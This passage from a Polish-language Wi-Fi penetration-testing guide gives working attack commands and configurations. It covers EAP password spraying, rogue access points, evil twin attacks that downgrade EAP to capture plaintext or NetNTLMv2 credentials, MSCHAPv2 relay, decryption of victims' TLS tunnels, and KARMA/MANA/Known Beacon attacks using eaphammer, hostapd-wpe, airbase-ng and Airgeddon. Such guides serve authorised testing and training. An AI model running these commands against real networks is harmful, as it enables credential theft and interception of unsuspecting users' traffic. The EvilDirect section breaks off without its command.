- Sprawdź, czy klienci używają anonimowych zewnętrznych identyfikatorów (pseudonimów) dla EAP‑SIM/AKA zgodnie z wytycznymi 3GPP (np. 3GPP TS 33.402).
- Preferuj tunelowanie fazy identyfikacji (np. EAP‑TTLS/PEAP niosący wewnętrzny EAP‑SIM/AKA), aby IMSI nigdy nie było wysyłane jawnie.
- Zrzuty pakietów z association/auth nigdy nie powinny ujawniać surowego IMSI w EAP-Response/Identity.

Related: Telecom signalling exploitation with captured mobile identifiers
{{#ref}}
../pentesting-network/telecom-network-exploitation.md
{{#endref}}

### EAP-Bruteforce (password spray)

Jeśli od klienta wymaga się użycia **username and password** (uwaga: **EAP-TLS won't be valid** w tym przypadku), możesz spróbować zdobyć **listę usernames** (patrz następna część) i **passwords**, po czym spróbować uzyskać dostęp metodą **bruteforce** za pomocą [**air-hammer**](https://github.com/Wh1t3Rh1n0/air-hammer).
```bash
./air-hammer.py -i wlan0 -e Test-Network -P UserPassword1 -u usernames.txt
```
Możesz też przeprowadzić ten atak przy użyciu `eaphammer`:
```bash
./eaphammer --eap-spray \
--interface-pool wlan0 wlan1 wlan2 wlan3 wlan4 \
--essid example-wifi \
--password bananas \
--user-list users.txt
```
## Teoria ataków na klienta

### Wybór sieci i roaming

- Protokół 802.11 definiuje, jak stacja dołącza do Extended Service Set (ESS), ale nie określa kryteriów wyboru ESS ani access point (AP) w jego ramach.
- Stacje mogą przemieszczać się między AP udostępniającymi ten sam ESSID, utrzymując łączność w obrębie budynku lub obszaru.
- Protokół wymaga uwierzytelnienia stacji w ESS, ale nie nakłada obowiązku uwierzytelniania AP względem stacji.

### Preferred Network Lists (PNL)

- Stacje zapisują ESSID każdej sieci bezprzewodowej, z którą się łączą, w swojej Preferred Network List (PNL), wraz ze szczegółami konfiguracji specyficznymi dla sieci.
- PNL jest używana do automatycznego łączenia się z znanymi sieciami, poprawiając doświadczenie użytkownika przez uproszczenie procesu łączenia.

### Skanowanie pasywne

- AP okresowo nadają beacon frames, ogłaszając swoją obecność i funkcje, w tym ESSID AP, chyba że nadawanie jest wyłączone.
- Podczas skanowania pasywnego stacje nasłuchują beacon frames. Jeśli ESSID z beacon odpowiada wpisowi w PNL stacji, stacja może automatycznie połączyć się z tym AP.
- Znajomość PNL urządzenia umożliwia potencjalne wykorzystanie przez naśladowanie ESSID znanej sieci, oszukując urządzenie, aby połączyło się z rogue AP.

### Aktywne sondowanie

- Aktywne sondowanie polega na tym, że stacje wysyłają probe requests, aby wykryć pobliskie AP i ich charakterystyki.
- Directed probe requests są wysyłane do konkretnego ESSID, pomagając wykryć, czy dana sieć jest w zasięgu, nawet jeśli jest ukryta.
- Broadcast probe requests mają pole SSID ustawione na null i są wysyłane do wszystkich pobliskich AP, pozwalając stacji sprawdzić dowolną preferowaną sieć bez ujawniania zawartości PNL.

## Prosty AP z przekierowaniem do Internetu

Zanim wyjaśnimy, jak przeprowadzać bardziej złożone ataki, zostanie wyjaśnione **jak** po prostu **utworzyć** **AP** i **przekierować** jego **ruch** na interfejs połączony z **Internetem**.

Używając `ifconfig -a` sprawdź, czy interfejs wlan, na którym utworzysz AP, oraz interfejs połączony z Internetem są obecne.

### DHCP & DNS
```bash
apt-get install dnsmasq #Manages DHCP and DNS
```
Utwórz plik konfiguracyjny `/etc/dnsmasq.conf`:
```ini
interface=wlan0
dhcp-authoritative
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
```
Następnie **ustaw IPs** i **routes**:
```bash
ifconfig wlan0 up 192.168.1.1 netmask 255.255.255.0
route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
```
A następnie **uruchom** dnsmasq:
```bash
dnsmasq -C dnsmasq.conf -d
```
### hostapd
```bash
apt-get install hostapd
```
Utwórz plik konfiguracyjny `hostapd.conf`:
```ini
interface=wlan0
driver=nl80211
ssid=MITIWIFI
hw_mode=g
channel=11
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wpa=2
wpa_passphrase=mitmwifi123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=CCMP
wpa_group_rekey=86400
ieee80211n=1
wme_enabled=1
```
**Zatrzymaj uciążliwe procesy**, ustaw **monitor mode**, i **uruchom hostapd**:
```bash
airmon-ng check kill
iwconfig wlan0 mode monitor
ifconfig wlan0 up
hostapd ./hostapd.conf
```
### Przekazywanie i przekierowywanie
```bash
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
iptables --append FORWARD --in-interface wlan0 -j ACCEPT
echo 1 > /proc/sys/net/ipv4/ip_forward
```
## Evil Twin

An evil twin attack wykorzystuje sposób, w jaki WiFi clients rozpoznają sieci, opierając się głównie na nazwie sieci (ESSID) i nie wymagając, żeby base station (access point) uwierzytelniał się wobec clienta. Najważniejsze punkty obejmują:

- **Trudność w rozróżnianiu**: Urządzenia mają problemy z odróżnieniem legalnych i rogue access points, gdy dzielą tę samą ESSID i typ szyfrowania. Sieci w rzeczywistych środowiskach często używają wielu access points z tą samą ESSID, aby bezszwowo rozszerzyć zasięg.
- **Client Roaming i manipulacja połączeniem**: Protokół 802.11 pozwala urządzeniom na przemieszczanie się między access points w ramach tego samego ESS. Atakujący mogą to wykorzystać, skłaniając urządzenie do rozłączenia się z aktualnym base station i połączenia się z rogue access point. Można to osiągnąć oferując silniejszy sygnał lub zakłócając połączenie z legalnym access point za pomocą metod takich jak deauthentication packets lub jamming.
- **Wyzwania w realizacji**: Skuteczne przeprowadzenie evil twin attack w środowiskach z wieloma dobrze rozmieszczonymi access points może być trudne. Deauthenticating pojedynczego legalnego access point często skutkuje połączeniem urządzenia z innym legalnym access point, chyba że atakujący potrafi deauthenticate wszystkie pobliskie access points lub strategicznie umieścić rogue access point.

You can create a very basic Open Evil Twin (no capabilities to route traffic to Internet) doing:
```bash
airbase-ng -a 00:09:5B:6F:64:1E --essid "Elroy" -c 1 wlan0mon
```
Możesz też utworzyć Evil Twin za pomocą **eaphammer** (zauważ, że aby tworzyć evil twins za pomocą eaphammer interfejs **nie powinien być** w **monitor** mode):
```bash
./eaphammer -i wlan0 --essid exampleCorp --captive-portal
```
Lub używając Airgeddon: `Options: 5,6,7,8,9 (inside Evil Twin attack menu).`

![](<../../images/image (1088).png>)

Proszę zauważyć, że domyślnie, jeśli ESSID w PNL jest oznaczony jako chroniony WPA, urządzenie nie połączy się automatycznie z Open evil Twin. Możesz spróbować DoS-ować prawdziwy AP i mieć nadzieję, że użytkownik ręcznie połączy się z twoim Open evil twin, albo możesz DoS-ować prawdziwy AP i użyć WPA Evil Twin, aby przechwycić handshake (używając tej metody nie będziesz w stanie pozwolić ofierze połączyć się z tobą, ponieważ nie znasz PSK, ale możesz przechwycić handshake i spróbować go złamać).

_Niektóre OS i AV ostrzegają użytkownika, że połączenie z Open network jest niebezpieczne..._

### WPA/WPA2 Evil Twin

Możesz stworzyć **Evil Twin using WPA/2** i jeśli urządzenia zostały skonfigurowane do łączenia się z tym SSID przy użyciu WPA/2, będą próbować się połączyć. Tak czy inaczej, **to complete the 4-way-handshake** musisz także **znać** **hasło**, którego klient zamierza użyć. Jeśli **nie znasz** go, **połączenie nie zostanie zakończone**.
```bash
./eaphammer -i wlan0 -e exampleCorp -c 11 --creds --auth wpa-psk --wpa-passphrase "mywifipassword"
```
### Enterprise Evil Twin

Aby zrozumieć te ataki, zalecam najpierw przeczytać krótkie [WPA Enterprise wyjaśnienie](#wpa-enterprise-mgt).

**Korzystanie z hostapd-wpe**

`hostapd-wpe` wymaga pliku **konfiguracji**, aby działać. Aby **zautomatyzować** generowanie tych konfiguracji możesz użyć [https://github.com/WJDigby/apd_launchpad](https://github.com/WJDigby/apd_launchpad) (pobierz plik python znajdujący się w _/etc/hostapd-wpe/_).
```bash
./apd_launchpad.py -t victim -s PrivateSSID -i wlan0 -cn company.com
hostapd-wpe ./victim/victim.conf -s
```
W pliku konfiguracyjnym możesz wybrać wiele różnych rzeczy, takich jak ssid, channel, user files, cret/key, dh parameters, wpa version i auth...

[**Using hostapd-wpe with EAP-TLS to allow any certificate to login.**](evil-twin-eap-tls.md)

**Korzystanie z EAPHammer**
```bash
# Generate Certificates
./eaphammer --cert-wizard

# Launch Attack
./eaphammer -i wlan0 --channel 4 --auth wpa-eap --essid CorpWifi --creds
```
Domyślnie EAPHammer używa następujących metod auth (zwróć uwagę, że GTC jest pierwszą, którą próbuje się użyć, aby uzyskać plaintext passwords, a następnie stosowane są bardziej odporne metody auth):
```
GTC,MSCHAPV2,TTLS-MSCHAPV2,TTLS,TTLS-CHAP,TTLS-PAP,TTLS-MSCHAP,MD5
```
To jest domyślna metodologia, aby uniknąć długich czasów połączenia. Możesz jednak także określić serverowi authentication methods od najsłabszych do najsilniejszych:
```
--negotiate weakest
```
Możesz też użyć:

- `--negotiate gtc-downgrade` aby użyć wysoce wydajnej implementacji GTC downgrade (plaintext passwords)
- `--negotiate manual --phase-1-methods PEAP,TTLS --phase-2-methods MSCHAPV2,GTC,TTLS-PAP` aby ręcznie określić metody oferowane (oferowanie tych samych metod uwierzytelniania w tej samej kolejności co organizacja znacznie utrudni wykrycie ataku).
- [Find more info in the wiki](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)

#### When clients skip RADIUS certificate validation (PEAP/TTLS)

- Jeśli urządzenia są skonfigurowane jako "do not validate certificate", sklonowany AP + rogue RADIUS (`eaphammer --cert-wizard --creds --auth wpa-eap`) zbierze **NetNTLMv2** (PEAP-MSCHAPv2) lub **cleartext** creds (PEAP-GTC). `bettercap` deauth (`wifi.deauth <BSSID>`) zarówno ujawnia ukryte SSID podczas probe'ów, jak i wymusza ponowne łączenia, chyba że PMF/802.11w blokuje sfałszowane deauth.
- Złamany NetNTLMv2 daje możliwe do ponownego użycia Wi‑Fi/AD creds; GTC zwraca natychmiastowy plaintext.

#### Relaying PEAP-MSCHAPv2 instead of cracking (wpa_sycophant + hostapd-mana)

- W przypadku kont maszynowych z trudnymi do złamania losowymi hasłami, nadużyj **MSCHAPv2 relay**: uruchom `hostapd-mana` jako Evil Twin, przekazując wymianę MSCHAPv2 do `wpa_sycophant`, który jednocześnie łączy się z legalnym AP. Udane przekazanie przyznaje uwierzytelnione Wi‑Fi bez odzyskiwania hasła.
- Używaj buildów obsługujących docelowy poziom bezpieczeństwa (WPA3/PMF wymaga nowszego hostapd/wpa_supplicant); PMF uniemożliwia wymuszanie deauth, więc poczekaj na dobrowolne skojarzenia klientów.

**Using Airgeddon**

`Airgeddon` może użyć wcześniej wygenerowanych certyfikatów, aby zaoferować uwierzytelnianie EAP w sieciach WPA/WPA2-Enterprise. Fałszywa sieć obniży protokół połączenia do EAP-MD5, dzięki czemu będzie mogła przechwycić użytkownika i MD5 hasła. Później atakujący może spróbować złamać hasło.\
`Airggedon` daje możliwość przeprowadzenia ciągłego Evil Twin attack (noisy) lub tylko utworzenia Evil Attack do momentu, aż ktoś się połączy (smooth).

![](<../../images/image (936).png>)

### Debugging PEAP and EAP-TTLS TLS tunnels in Evil Twins attacks

_This method was tested in an PEAP connection but as I'm decrypting an arbitrary TLS tunnel this should also works with EAP-TTLS_

W konfiguracji _hostapd-wpe_ skomentuj linię zawierającą _**dh_file**_ (zmień `dh_file=/etc/hostapd-wpe/certs/dh` na `#dh_file=/etc/hostapd-wpe/certs/dh`).\
To spowoduje, że `hostapd-wpe` będzie wymieniać klucze używając RSA zamiast DH, dzięki czemu będzie można później odszyfrować ruch znając prywatny klucz serwera.

Teraz uruchom Evil Twin używając `hostapd-wpe` z tą zmodyfikowaną konfiguracją jak zwykle. Uruchom też `wireshark` na interfejsie wykonującym atak Evil Twin.

Teraz lub później (gdy już przechwycisz kilka prób uwierzytelnienia) możesz dodać prywatny klucz RSA do wiresharka w: `Edit --> Preferences --> Protocols --> TLS --> (RSA keys list) Edit...`

Dodaj nowy wpis i wypełnij formularz tymi wartościami: **IP address = any** -- **Port = 0** -- **Protocol = data** -- **Key File** (**wybierz swój plik klucza**, aby uniknąć problemów wybierz plik klucza **bez ochrony hasłem**).

![](<../../images/image (687).png>)

I spójrz na nową zakładkę **"Decrypted TLS"**:

![](<../../images/image (231).png>)

## KARMA, MANA, Loud MANA and Known beacons attack

### ESSID and MAC black/whitelists

Różne typy Media Access Control Filter Lists (MFACLs) oraz ich odpowiadające tryby i wpływ na zachowanie rogue Access Point (AP):

1. **MAC-based Whitelist**:
- Rogue AP będzie odpowiadać tylko na probe requests od urządzeń wymienionych na whitelist, pozostając niewidoczny dla wszystkich innych niewymienionych.
2. **MAC-based Blacklist**:
- Rogue AP będzie ignorować probe requests od urządzeń na blacklist, efektywnie czyniąc rogue AP niewidocznym dla tych konkretnych urządzeń.
3. **SSID-based Whitelist**:
- Rogue AP będzie odpowiadać na probe requests tylko dla konkretnych ESSIDów z listy, czyniąc go niewidocznym dla urządzeń, których Preferred Network Lists (PNLs) nie zawierają tych ESSIDów.
4. **SSID-based Blacklist**:
- Rogue AP nie będzie odpowiadać na probe requests dla konkretnych ESSIDów znajdujących się na blacklist, czyniąc go niewidocznym dla urządzeń poszukujących tych sieci.
```bash
# example EAPHammer MFACL file, wildcards can be used
09:6a:06:c8:36:af
37:ab:46:7a:9a:7c
c7:36:8c:b2:*:*

[--mac-whitelist /path/to/mac/whitelist/file.txt #EAPHammer whitelisting]
[--mac-blacklist /path/to/mac/blacklist/file.txt #EAPHammer blacklisting]
```

```bash
# example ESSID-based MFACL file
name1
name2
name3

[--ssid-whitelist /path/to/mac/whitelist/file.txt]
[--ssid-blacklist /path/to/mac/blacklist/file.txt]
```
### KARMA

Ta metoda pozwala **attacker to create a malicious access point (AP) that responds to all probe requests** od urządzeń próbujących połączyć się z sieciami. Ta technika **tricks devices into connecting to an attacker's AP** przez naśladowanie sieci, których urządzenia wyszukują. Gdy urządzenie wyśle żądanie połączenia do tego rogue AP, połączenie zostaje nawiązane, powodując, że urządzenie błędnie łączy się z siecią atakującego.

### MANA

Następnie **devices started to ignore unsolid network responses**, co zmniejszyło skuteczność oryginalnego karma attack. Jednak pojawiła się nowa metoda, znana jako **MANA attack**, zaproponowana przez Ian de Villiers i Dominic White. Metoda ta polega na tym, że rogue AP **capturing the Preferred Network Lists (PNL) from devices by responding to their broadcast probe requests** nazwami sieci (SSIDs), które wcześniej były zapamiętane przez urządzenia. Ten zaawansowany atak omija zabezpieczenia przeciwko oryginalnemu karma attack, wykorzystując sposób, w jaki urządzenia zapamiętują i priorytetyzują znane sieci.

The MANA attack działa przez monitorowanie zarówno directed, jak i broadcast probe requests od urządzeń. W przypadku directed requests rejestruje adres MAC urządzenia i żądaną nazwę sieci, dodając te informacje do listy. Gdy otrzymane zostanie broadcast request, AP odpowiada informacją pasującą do którejkolwiek sieci na liście urządzenia, kusząc urządzenie do połączenia z rogue AP.
```bash
./eaphammer -i wlan0 --cloaking full --mana --mac-whitelist whitelist.txt [--captive-portal] [--auth wpa-psk --creds]
```
### Loud MANA

A **Loud MANA attack** to zaawansowana strategia stosowana, gdy urządzenia nie używają directed probing lub gdy ich Preferred Network Lists (PNL) są nieznane atakującemu. Działa na zasadzie, że **urządzenia w tym samym obszarze prawdopodobnie dzielą pewne nazwy sieci w swoich PNL**. Zamiast odpowiadać wybiórczo, ten atak emituje probe responses dla każdej nazwy sieci (ESSID) znalezionej w połączonych PNL wszystkich obserwowanych urządzeń. Takie szerokie podejście zwiększa szansę, że urządzenie rozpozna znajomą sieć i spróbuje połączyć się z rogue Access Point (AP).
```bash
./eaphammer -i wlan0 --cloaking full --mana --loud [--captive-portal] [--auth wpa-psk --creds]
```
### Known Beacon attack

Gdy **Loud MANA attack** może nie wystarczyć, **Known Beacon attack** oferuje inne podejście. Ta metoda **brute-forces the connection process by simulating an AP that responds to any network name, cycling through a list of potential ESSIDs** pochodzących z wordlisty. To symuluje obecność licznych sieci, mając nadzieję na dopasowanie ESSID w PNL ofiary, co wywołuje próbę połączenia z sfałszowanym AP. Atak można wzmocnić, łącząc go z opcją `--loud`, aby uzyskać bardziej agresywną próbę złapania urządzeń.

Eaphammer zaimplementował ten atak jako MANA attack, w którym wszystkie ESSIDs z listy są nadawane (możesz też połączyć to z `--loud`, aby stworzyć Loud MANA + Known beacons attack):
```bash
./eaphammer -i wlan0 --mana [--loud] --known-beacons  --known-ssids-file wordlist.txt [--captive-portal] [--auth wpa-psk --creds]
```
**Known Beacon Burst attack**

**Known Beacon Burst attack** polega na **szybkim nadawaniu beacon frames dla każdego ESSID wymienionego w pliku**. Tworzy to gęste środowisko fałszywych sieci, znacznie zwiększając prawdopodobieństwo, że urządzenia połączą się z rogue AP, szczególnie w połączeniu z MANA attack. Ta technika wykorzystuje szybkość i skalę, aby przeciążyć mechanizmy wyboru sieci w urządzeniach.
```bash
# transmit a burst of 5 forged beacon packets for each entry in list
./forge-beacons -i wlan1 \
--bssid de:ad:be:ef:13:37 \
--known-essids-file known-s.txt \
--dst-addr 11:22:33:11:22:33 \
--burst-count 5
```
## Wi-Fi Direct

**Wi-Fi Direct** to protokół umożliwiający urządzeniom łączenie się bezpośrednio ze sobą przez Wi-Fi bez potrzeby użycia tradycyjnego punktu dostępowego. Funkcja ta jest zintegrowana w różnych urządzeniach IoT, takich jak drukarki i telewizory, ułatwiając bezpośrednią komunikację między urządzeniami. Charakterystyczną cechą Wi-Fi Direct jest to, że jedno urządzenie pełni rolę punktu dostępowego, znane jako group owner, zarządzając połączeniem.

Bezpieczeństwo połączeń Wi-Fi Direct opiera się na **Wi-Fi Protected Setup (WPS)**, które obsługuje kilka metod bezpiecznego parowania, w tym:

- **Push-Button Configuration (PBC)**
- **PIN entry**
- **Near-Field Communication (NFC)**

Te metody, szczególnie PIN entry, są podatne na te same luki co WPS w tradycyjnych sieciach Wi-Fi, co czyni je celem podobnych wektorów ataku.

### EvilDirect Hijacking

**EvilDirect Hijacking** to atak specyficzny dla Wi-Fi Direct. Odzwierciedla koncepcję Evil Twin, ale celuje w połączenia Wi-Fi Direct. W tym scenariuszu atakujący podszywa się pod prawowitego group ownera, z zamiarem skłonienia urządzeń do połączenia się z złośliwym podmiotem. Metodę tę można wykonać przy użyciu narzędzi takich jak `airbase-ng`, określając kanał, ESSID i adres MAC podszywanego urządzenia:

## Odnośniki

- [https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee](https://posts.specterops.io/modern-wireless-attacks-pt-i-basic-rogue-ap-theory-evil-twin-and-karma-attacks-35a8571550ee)
- [https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9](https://posts.specterops.io/modern-wireless-attacks-pt-ii-mana-and-known-beacon-attacks-97a359d385f9)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38](https://posts.specterops.io/modern-wireless-tradecraft-pt-iii-management-frame-access-control-lists-mfacls-22ca7f314a38)
- [https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d](https://posts.specterops.io/modern-wireless-tradecraft-pt-iv-tradecraft-and-detection-d1a95da4bb4d)
- [https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf](https://github.com/gdssecurity/Whitepapers/blob/master/GDS%20Labs%20-%20Identifying%20Rogue%20Access%20Point%20Attacks%20Using%20Probe%20Response%20Patterns%20and%20Signal%20Strength.pdf)
- [http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/](http://solstice.sh/wireless/eaphammer/2019/09/10/eap-downgrade-attacks/)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d](https://medium.com/hacking-info-sec/ataque-clientless-a-wpa-wpa2-usando-pmkid-1147d72f464d)
- [https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)](<https://forums.kali.org/showthread.php?24286-WPS-Pixie-Dust-Attack-(Offline-WPS-Attack)>)
- [https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/](https://www.evilsocket.net/2019/02/13/Pwning-WiFi-networks-with-bettercap-and-the-PMKID-client-less-attack/)
- [The vulnerability that killed FreeWifi_Secure](https://7h30th3r0n3.fr/the-vulnerability-that-killed-freewifi_secure/)
- [RFC 4186 – EAP-SIM Authentication](https://datatracker.ietf.org/doc/html/rfc4186)
- [3GPP TS 33.402 – 3GPP system architecture evolution (SAE); Security aspects of non-3GPP accesses](https://www.3gpp.org/ftp/Specs/archive/33_series/33.402/)
- [Wireless-(in)Fidelity: Pentesting Wi-Fi in 2025 (Synacktiv)](https://www.synacktiv.com/en/publications/wireless-infidelity-pentesting-wi-fi-in-2025.html)
- [PEAP relay attacks with wpa_sycophant (SensePost)](https://sensepost.com/blog/2019/peap-relay-attacks-with-wpa_sycophant/)


TODO: Zobacz też [https://github.com/wifiphisher/wifiphisher](https://github.com/wifiphisher/wifiphisher) (logowanie przez Facebook i imitacja WPA w captive portals)

{{#include ../../banners/hacktricks-training.md}}
